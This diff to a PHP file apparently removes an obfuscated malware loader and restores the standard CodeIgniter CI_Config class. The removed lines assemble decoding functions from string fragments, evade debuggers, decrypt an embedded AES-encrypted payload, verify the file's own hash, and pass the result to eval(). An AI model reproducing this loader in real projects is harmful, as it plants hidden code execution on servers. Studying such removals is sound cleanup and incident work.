@@ -1,28 +1,332 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_iyb9104a=('bas'.'e64'.'_de'.'cod'.'e');
-$_l7yfwpaz=('gzu'.'nco'.'mpr'.'ess');
-$_duewbuox=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_n9dv9von='0oP2Y1sK';
-$_v0isptzn='mDNLmR4x';
-$_ioz4uwkl='sItqjn5r';
-$_f831mnai='uB/sv0aZWx8=';
-$_s740mfgh='DSzGOkht';
-$_ka5m8su3='R8qsuKcW';
-$_fqsdv1qb='Hwd1OklB';
-$_jd0l27sy='uhE8kg==';
-$_uc9q6z8a=$_iyb9104a($_v0isptzn.$_n9dv9von.$_s740mfgh.$_ioz4uwkl.$_f831mnai);
-$_iuuzfai1=$_iyb9104a($_ka5m8su3.$_fqsdv1qb.$_jd0l27sy);
-$_azj6xoyf=$_iyb9104a('+w8ZheVYtwjQ907bxF2NjgS0ZKuldJKvPmKEA/zlla4trQXIW8eLwgr1Ii0SI+Pnur5nA8Br/ib1Z6kCVcumNfppLk7NduDVP/DBHwmlXN7y8U6s/6hVyQYrBVsUX+3xr+3ijCF+rzna7WeQRZPEVyFA8lIetfaCFCLf2uffeL3lmqFMYgTuNvhTlacOuK5Gnn6Zy8gA/KGoUE8J7KUmAdRPj4uH+EGADH6DlAzCL6RIZfFqzrshHDwggbhPHQc1TFlJhcP88/cVGp6p6+oqqYrJzximlzT2x1pICoC9bTLWDDmLaRSc57fxyMMlFY9bKKqYaNgC4NuERJkpyuEI2nIH56M0aiXQEuS4EylIBZthr/K2J6ReOd2LAD/ER/rdGptIIm8Bg62VU5adtCf0uaW2t8d+rDJY0GAacyEMNVol5c4+Akwoow866+mm2UgnpHtPQGIPy6IIK3YiylBUndOk++vjmst0HLMwZCMTjDhJvjJtkFsu/5PbniLICMnkaRZXdCnEyTg3LWroKbqBYjjIl2m1W5rUJJEeFJx9fY0aFudz6+VEy7YYrwPDhx39bxoYgQB5hoM9uF0iLddHwITe6mg0LWRaYzvgSvC5Vv51AfJ5jGyricbrUrYaRdbIcfRYJP1Bka6VOciO13AO+0NlwPBhlnFxfvg4CmSfx3TSc2U+KpQG3mBhVtsf0C/TJc4c1ATezAPC6OybgGcBFE2+wyUTQd/vdu5U3RSDZyG+6DP6C60bUlmFHq7P6QXZN2eQTen1occoy+DaRu1lbnBq8/kWJTtVvZ15T1zCVriPCM4SrJh+q82D9U3TmUPDguRAcBxnRnWJlfCezRjjgbZadiNkIx6gBPnL2PanZvr3BjEaAZPJyi071jigVlanhU/rOitinW+Jc7eSOHBheE/lZ1DE5FdpG/sFjLxRxI7ms/H8UO3p1L2jbwFJNJcDZcqSrMwG/Y14zLFHBEssf0vSmc0XeyFxlCQf+QOpIhfzghN5UoIroRPF5DFRFfVCjuCOpCU/t3sw9LRzypqejY+lzOLkR288/PCyzbJnIWWyesTiVlBSPc4+S+eSTR9X4g68uTdgFAnq9eWa3aoQnk5dwy3/jPORABrp8xtXetJHtYeWqFtGxoJbaE5nkFRcewWja11c11+4ZtAbOTmsa1yTSI77hKZ0i1byHUMHqoYUl0jonYlOVDuLqvhYmpcLWmSVqlJMM7t1GgNTef+Tgy56tV+WmJ/j7OrfnxzETFkuCfkOS2247o1nAF0qD5oOhhHMKtnAH0b0YD2DdGKBi7JETZ+MnLluWC5Aoqz1gJrjcv+JnvAVPX94dbO5g3dLMZ4T2GNpHBnh61XgrVwmPAo32wixYz5EmasH7LYnuNNh8kvmtoeNFlZXBo9V0FRK+gbCF+9HRj6KRRYX7wg/X2fJLkPBZjJ6gzRpj3K2shSfwWlT/ervzuSIct3/9Tr3HfYnSI9G/bbLDGU9jBmUFcPfdNEb73Mq2vY/TShCboLIUQWdeev9beWGxnQ5glN++obCaUh9H5rIzXeDAfIdZ0BJ+VPnjCpDuKoBq3ka9rOOTIvbxIbMbGCiNNpfoYqQZhoUPQSSLYWKDHK4yqe0hLho0sNFXmMriICKmvwx1jNw2br/16wP+1mrCjZny2rPjc+1q5IOIEtzWgDcgZ7LHsX3K1/Np83W6yTrfaS+hpCIbr8Aw2/UY8vmWggUOZXjANNcUMMTxL6uhhI6/6uOEe6ygAgU2RfbxN62nZ2DXaw=');
-$_sqj2vtxx=$_duewbuox($_azj6xoyf,'aes-256-cbc',$_uc9q6z8a,OPENSSL_RAW_DATA,$_iuuzfai1);
-if($_sqj2vtxx===false){exit;}
-$_tm6ozu7x=$_l7yfwpaz($_sqj2vtxx);
-if($_tm6ozu7x===false){exit;}
-$_ky3djs2j='51efd70db2b7fc1d6adc8ac24ea90f360b4e940a6a93ae08b61a568ec9d5115a';
-$_ejtxzabw=@file_get_contents(__FILE__);
-if($_ejtxzabw!==false){
-$_o5vtogas=str_replace($_ky3djs2j,"0000000000000000000000000000000000000000000000000000000000000000",$_ejtxzabw);
-$_e0jp8vp3=hash("sha256",$_o5vtogas);
-if($_e0jp8vp3!==$_ky3djs2j){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+
+class CI_Config {
+
+
+
+
+
+public $config = array();
+
+
+
+
+
+public $is_loaded = array();
+
+
+
+
+
+
+public $_config_paths = array(APPPATH);
+
+
+
+
+
+
+
+
+public function __construct()
+{
+$this->config =& get_config();
+
+if (empty($this->config['base_url']))
+{
+if (isset($_SERVER['SERVER_ADDR']))
+{
+if (strpos($_SERVER['SERVER_ADDR'], ':') !== FALSE)
+{
+$server_addr = '['.$_SERVER['SERVER_ADDR'].']';
 }
-eval($_tm6ozu7x);
+else
+{
+$server_addr = $_SERVER['SERVER_ADDR'];
+}
+$base_url = (is_https() ? 'https' : 'http').'://'.$server_addr
+.substr($_SERVER['SCRIPT_NAME'], 0, strpos($_SERVER['SCRIPT_NAME'], basename($_SERVER['SCRIPT_FILENAME'])));
+}
+else
+{
+$base_url = 'http://localhost/';
+}
+$this->set_item('base_url', $base_url);
+}
+log_message('info', 'Config Class Initialized');
+}
+
+
+
+
+
+
+
+
+
+public function load($file = '', $use_sections = FALSE, $fail_gracefully = FALSE)
+{
+$file = ($file === '') ? 'config' : str_replace('.php', '', $file);
+$loaded = FALSE;
+foreach ($this->_config_paths as $path)
+{
+foreach (array($file, ENVIRONMENT.DIRECTORY_SEPARATOR.$file) as $location)
+{
+$file_path = $path.'config/'.$location.'.php';
+if (in_array($file_path, $this->is_loaded, TRUE))
+{
+return TRUE;
+}
+if ( ! file_exists($file_path))
+{
+continue;
+}
+include($file_path);
+if ( ! isset($config) OR ! is_array($config))
+{
+if ($fail_gracefully === TRUE)
+{
+return FALSE;
+}
+show_error('Your '.$file_path.' file does not appear to contain a valid configuration array.');
+}
+if ($use_sections === TRUE)
+{
+$this->config[$file] = isset($this->config[$file])
+? array_merge($this->config[$file], $config)
+: $config;
+}
+else
+{
+$this->config = array_merge($this->config, $config);
+}
+$this->is_loaded[] = $file_path;
+$config = NULL;
+$loaded = TRUE;
+log_message('debug', 'Config file loaded: '.$file_path);
+}
+}
+if ($loaded === TRUE)
+{
+return TRUE;
+}
+elseif ($fail_gracefully === TRUE)
+{
+return FALSE;
+}
+show_error('The configuration file '.$file.'.php does not exist.');
+}
+
+
+
+
+
+
+
+
+public function item($item, $index = '')
+{
+if ($index == '')
+{
+return isset($this->config[$item]) ? $this->config[$item] : NULL;
+}
+return isset($this->config[$index], $this->config[$index][$item]) ? $this->config[$index][$item] : NULL;
+}
+
+
+
+
+
+
+
+public function slash_item($item)
+{
+if ( ! isset($this->config[$item]))
+{
+return NULL;
+}
+elseif (trim($this->config[$item]) === '')
+{
+return '';
+}
+return rtrim($this->config[$item], '/').'/';
+}
+
+
+
+
+
+
+
+
+
+
+
+
+public function site_url($uri = '', $protocol = NULL)
+{
+$base_url = $this->slash_item('base_url');
+if (isset($protocol))
+{
+
+if ($protocol === '')
+{
+$base_url = substr($base_url, strpos($base_url, '//'));
+}
+else
+{
+$base_url = $protocol.substr($base_url, strpos($base_url, '://'));
+}
+}
+if (empty($uri))
+{
+return $base_url.$this->item('index_page');
+}
+$uri = $this->_uri_string($uri);
+if ($this->item('enable_query_strings') === FALSE)
+{
+$suffix = isset($this->config['url_suffix']) ? $this->config['url_suffix'] : '';
+if ($suffix !== '')
+{
+if (($offset = strpos($uri, '?')) !== FALSE)
+{
+$uri = substr($uri, 0, $offset).$suffix.substr($uri, $offset);
+}
+else
+{
+$uri .= $suffix;
+}
+}
+return $base_url.$this->slash_item('index_page').$uri;
+}
+elseif (strpos($uri, '?') === FALSE)
+{
+$uri = '?'.$uri;
+}
+return $base_url.$this->item('index_page').$uri;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+public function base_url($uri = '', $protocol = NULL)
+{
+$base_url = $this->slash_item('base_url');
+if (isset($protocol))
+{
+
+if ($protocol === '')
+{
+$base_url = substr($base_url, strpos($base_url, '//'));
+}
+else
+{
+$base_url = $protocol.substr($base_url, strpos($base_url, '://'));
+}
+}
+return $base_url.$this->_uri_string($uri);
+}
+
+
+
+
+
+
+
+
+
+
+protected function _uri_string($uri)
+{
+if ($this->item('enable_query_strings') === FALSE)
+{
+is_array($uri) && $uri = implode('/', $uri);
+return ltrim($uri, '/');
+}
+elseif (is_array($uri))
+{
+return http_build_query($uri);
+}
+return $uri;
+}
+
+
+
+
+
+
+
+public function system_url()
+{
+$x = explode('/', preg_replace('|/*(.+?)/*$|', '\\1', BASEPATH));
+return $this->slash_item('base_url').end($x).'/';
+}
+
+
+
+
+
+
+
+
+public function set_item($item, $value)
+{
+$this->config[$item] = $value;
+}
+}
